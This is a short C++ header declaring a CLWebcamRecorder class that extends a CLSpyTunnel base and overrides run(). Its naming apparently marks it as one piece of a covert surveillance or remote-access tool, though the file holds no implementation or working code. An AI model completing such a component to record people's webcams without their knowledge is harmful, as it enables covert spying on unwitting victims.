#ifndef CLWEBCAM_RECORDER_HPP
#define CLWEBCAM_RECORDER_HPP

#include "cltunnel_include.hpp"
#include "clspy_tunnel.hpp"

class CLWebcamRecorder : public CLSpyTunnel {
public:
    void run() override;
};
#endif // CLWEBCAM_RECORDER_HPP